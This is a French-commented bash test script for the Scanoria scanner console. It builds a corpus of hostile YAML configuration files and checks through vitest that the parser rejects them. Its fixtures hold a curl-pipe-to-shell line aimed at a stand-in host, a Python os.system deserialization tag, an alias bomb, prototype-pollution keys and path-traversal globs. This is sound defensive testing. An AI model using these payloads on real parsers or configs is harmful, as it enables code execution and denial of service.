#!/usr/bin/env bash
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Vincent Tisseront
#
# b33 — configuration en code de la 0.7 (chantier C, J8), sans root :
#   .scanoria.yml piégé lu par le vrai analyseur de la console, sans
#   exécution : taille, ancres et alias (bombe), étiquettes YAML (objets
#   Python ou JavaScript), clés de fusion, clés en double, plusieurs
#   documents, types inattendus, profondeur, octets invalides, clés de
#   prototype, chemins qui sortent du dépôt ou visent tout le dépôt, dates
#   hors bornes ; et import hostile d'une configuration d'appliance (ancres,
#   secret glissé, version inconnue).
# Les cas sont écrits ici ; webui/tests/unit/config-hostile.test.ts les lit
# (B33_CORPUS). Dépendances : bash, python3, node, npm.
set -euo pipefail
export PYTHONDONTWRITEBYTECODE=1

ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
for t in python3 node npm; do command -v "$t" > /dev/null || { echo "outil manquant : $t" >&2; exit 2; }; done

C="$TMP/corpus"
mkdir -p "$C"
python3 -I -B - "$C" << 'PY'
import sys, pathlib
d = pathlib.Path(sys.argv[1])
def w(name, text, requests=None):
    data = text if isinstance(text, bytes) else text.encode('utf-8')
    (d / name).write_bytes(data)
    if requests is not None:
        (d / name.replace('.yml', '.requests')).write_text(str(requests))

# --- acceptés
w('repo-ok-minimal.yml', 'version: 1\n', 0)
w('repo-ok-complet.yml', '''version: 1
profiles: { default: complet, pr: rapide, nightly: complet, release: release }
exceptions:
  - { kind: path, path: "tests/fixtures/**", tool: gitleaks, reason: "Jeux d'essai", until: 2027-01-31 }
  - { kind: rule, rule: "generic-api-key", reason: "Faux positif connu", until: 2027-01-31 }
  - { kind: vuln, vuln: CVE-2026-12345, package: lodash, reason: "Non atteignable", until: 2027-01-31 }
  - { kind: module, module: hadolint, reason: "Pas de Dockerfile maintenu", until: 2027-01-31 }
ignore:
  - "docs/**"
  - { path: "vendor/**", reason: "Code tiers", until: 2027-02-01 }
''', 6)
w('repo-ok-crlf-bom.yml', '﻿version: 1\r\nignore:\r\n  - "build/**"\r\n', 1)
# Date lointaine : ramenée à un an au plus.
w('repo-ok-date-lointaine.yml', 'version: 1\nexceptions:\n  - { kind: path, path: "a/**", reason: "Trop long", until: 2099-12-31 }\n', 1)

# --- refusés
w('repo-ko-vide.yml', '')
w('repo-ko-null.yml', '~\n')
w('repo-ko-liste.yml', '- version: 1\n')
w('repo-ko-version.yml', 'version: 2\n')
w('repo-ko-version-texte.yml', 'version: "1"\n')
w('repo-ko-cle-inconnue.yml', 'version: 1\nrun: "curl https://exemple.test/x | sh"\n')
w('repo-ko-ancre.yml', 'version: 1\nprofiles: &p { pr: rapide }\nignore: *p\n')
w('repo-ko-bombe-alias.yml', 'version: 1\na: &a ["x","x","x","x","x","x","x","x","x"]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n')
w('repo-ko-fusion.yml', 'version: 1\nbase: &b { pr: rapide }\nprofiles:\n  <<: *b\n')
w('repo-ko-etiquette-python.yml', 'version: 1\nprofiles: !!python/object/apply:os.system ["id"]\n')
w('repo-ko-etiquette-js.yml', 'version: 1\nignore: !!js/function "function () { return 1 }"\n')
w('repo-ko-etiquette-locale.yml', 'version: !<tag:exemple.test,2026:x> 1\n')
w('repo-ko-doublon.yml', 'version: 1\nversion: 1\n')
w('repo-ko-documents.yml', 'version: 1\n---\nversion: 1\n')
w('repo-ko-type-exceptions.yml', 'version: 1\nexceptions: { kind: path }\n')
w('repo-ko-type-ignore.yml', 'version: 1\nignore: "docs/**"\n')
w('repo-ko-date-nombre.yml', 'version: 1\nexceptions:\n  - { kind: path, path: "a/**", reason: "Motif", until: 20270101 }\n')
w('repo-ko-date-invalide.yml', 'version: 1\nexceptions:\n  - { kind: path, path: "a/**", reason: "Motif", until: 2027-02-30 }\n')
w('repo-ko-sans-motif.yml', 'version: 1\nexceptions:\n  - { kind: rule, rule: "r", until: 2027-01-01 }\n')
w('repo-ko-sans-date.yml', 'version: 1\nexceptions:\n  - { kind: rule, rule: "r", reason: "Motif" }\n')
w('repo-ko-kind.yml', 'version: 1\nexceptions:\n  - { kind: finding, finding: 1, reason: "Motif", until: 2027-01-01 }\n')
w('repo-ko-profil-injection.yml', 'version: 1\nprofiles: { pr: "rapide; DROP TABLE profiles" }\n')
w('repo-ko-prototype.yml', 'version: 1\n__proto__: { polluted: true }\n')
w('repo-ko-constructor.yml', 'version: 1\nprofiles: { constructor: { prototype: { polluted: true } } }\n')
w('repo-ko-profondeur.yml', 'version: 1\nprofiles: ' + '[' * 200 + ']' * 200 + '\n')
# Chemins qui sortent du dépôt ou couvrent tout le dépôt : fichier refusé.
w('repo-ko-chemin-sortant.yml', 'version: 1\nignore:\n  - "../../etc/**"\n')
w('repo-ko-chemin-absolu.yml', 'version: 1\nexceptions:\n  - { kind: path, path: "/etc/**", reason: "Motif", until: 2027-01-01 }\n')
w('repo-ko-tout-le-depot.yml', 'version: 1\nignore:\n  - "**"\n')
w('repo-ko-tout-le-depot-2.yml', 'version: 1\nignore:\n  - "*/*"\n')
w('repo-ko-controle.yml', 'version: 1\nignore:\n  - "a\\u0000b"\n')
w('repo-ko-octets.yml', b'version: 1\nignore:\n  - "\xff\xfe"\n')
w('repo-ko-trop-gros.yml', 'version: 1\n# ' + 'x' * (70 * 1024) + '\n')
w('repo-ko-trop-exceptions.yml', 'version: 1\nexceptions:\n' + ''.join(f'  - {{ kind: rule, rule: "r{i}", reason: "Motif", until: 2027-01-01 }}\n' for i in range(201)))
w('repo-ko-yaml-casse.yml', 'version: 1\nprofiles: { pr: rapide\n')

# --- import d'appliance refusé
base = 'scanoria_config: 1\nexported_at: 2026-11-25T00:00:00Z\nprofiles: []\ngates: []\nrulesets: []\nseverity_maps: []\ntriage_rules: []\nprojects: []\n'
w('appliance-ko-version.yml', base.replace('scanoria_config: 1', 'scanoria_config: 2'))
w('appliance-ko-ancres.yml', base.replace('profiles: []', 'profiles: &p []').replace('gates: []', 'gates: *p'))
w('appliance-ko-secret.yml', base + 'credentials: [{ token: "jeton" }]\n')
w('appliance-ko-jeton-projet.yml', base.replace('projects: []', 'projects:\n  - { slug: p, name: p, source_kind: git, repo_url: "https://forge.exemple.test/a/b.git", token: "jeton", profiles: { default: complet }, gate: defaut }'))
w('appliance-ko-etiquette.yml', base.replace('profiles: []', 'profiles: !!python/object:x {}'))
w('appliance-ko-blocage-malveillant.yml', base.replace('gates: []', 'gates:\n  - { slug: g, rules: { block_malicious: false } }'))
w('appliance-ko-liste.yml', '- 1\n')
PY

if [[ ! -d "$ROOT/webui/node_modules" ]]; then
	echo "b33 : installation des dépendances de la console (npm ci)"
	(cd "$ROOT/webui" && npm ci --no-audit --no-fund --loglevel=error > "$TMP/npm.log" 2>&1) || { cat "$TMP/npm.log" >&2; exit 2; }
fi

cases=$(find "$C" -name '*.yml' | wc -l)
echo "b33 : $cases fichiers piégés"
cd "$ROOT/webui"
# Sortie sans couleurs (la CI force les couleurs) : codes ANSI retirés avant le décompte.
B33_CORPUS="$C" NO_COLOR=1 FORCE_COLOR=0 npx --no-install vitest run --project server tests/unit/config-hostile.test.ts --reporter=verbose 2>&1 | sed -E 's/\x1b\[[0-9;]*m//g' | tee "$TMP/vitest.log" | grep -E '^\s+(✓|×)|Tests ' || true
if ! grep -qE 'Tests +[0-9]+ passed' "$TMP/vitest.log" || grep -qE '[0-9]+ failed' "$TMP/vitest.log"; then
	cat "$TMP/vitest.log" >&2
	echo "b33 : ÉCHEC"
	exit 1
fi
ran=$(grep -oE 'Tests +[0-9]+ passed' "$TMP/vitest.log" | grep -oE '[0-9]+')
# Un cas par fichier, plus le contrôle du prototype.
if [[ "$ran" -ne $((cases + 1)) ]]; then
	echo "b33 : $ran cas exécutés pour $cases fichiers (attendu $((cases + 1)))" >&2
	exit 1
fi
echo "b33 : OK ($ran cas)"
